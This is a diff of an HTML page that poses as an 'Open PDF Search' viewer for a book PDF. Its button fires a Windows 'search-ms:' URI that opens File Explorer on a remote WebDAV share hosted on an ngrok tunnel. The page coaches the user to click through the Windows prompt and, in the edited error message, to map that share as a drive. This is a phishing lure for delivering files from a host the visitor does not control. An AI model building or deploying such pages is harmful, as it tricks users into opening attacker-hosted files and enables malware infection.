@@ -7,31 +7,16 @@
   <h1>Open PDF Search</h1>
   <p><a href="https://a231-38-247-64-82.ngrok-free.app/share/LawsofHumanNature.pdf">View PDF</a></p>
   <p><strong>Note:</strong> Windows may prompt to allow the search. Click "OK".</p>
-  <p id="browser-warning" style="display: none; color: red;">
-    Firefox may not support this. Use Chrome/Edge or the PDF link.
-  </p>
   <button onclick="openSearch()">Search PDF</button>
   <script>
-    function isFirefox() {
-      return navigator.userAgent.toLowerCase().includes("firefox");
-    }
-
     function openSearch() {
       const searchUri = confirm('Is WebDAV mapped as a drive (e.g., Z:)?')
         ? "search-ms:query=LawsofHumanNature&crumb=location:Z:\\"
         : "search-ms:query=LawsofHumanNature&crumb=location:\\\\a231-38-247-64-82.ngrok-free.app@SSL\\share";
-      if (isFirefox()) {
-        document.getElementById("browser-warning").style.display = "block";
-        alert("Firefox may not support this. Use Chrome, Edge, or the PDF link.");
-      }
       try {
         window.location.href = searchUri;
-        setTimeout(() => {
-          alert("If Explorer didn’t open, ensure the WebDAV share (\\\\a231-38-247-64-82.ngrok-free.app@SSL\\share) is accessible. Try mapping as a drive or use the PDF link.");
-        }, 3000);
       } catch (e) {
-        document.getElementById("browser-warning").style.display = "block";
-        alert("Error: " + e.message + ". Use the PDF link.");
+        alert("Error: " + e.message + ". Map the share (https://a231-38-247-64-82.ngrok-free.app/share) as a drive or use the PDF link.");
       }
     }
   </script>
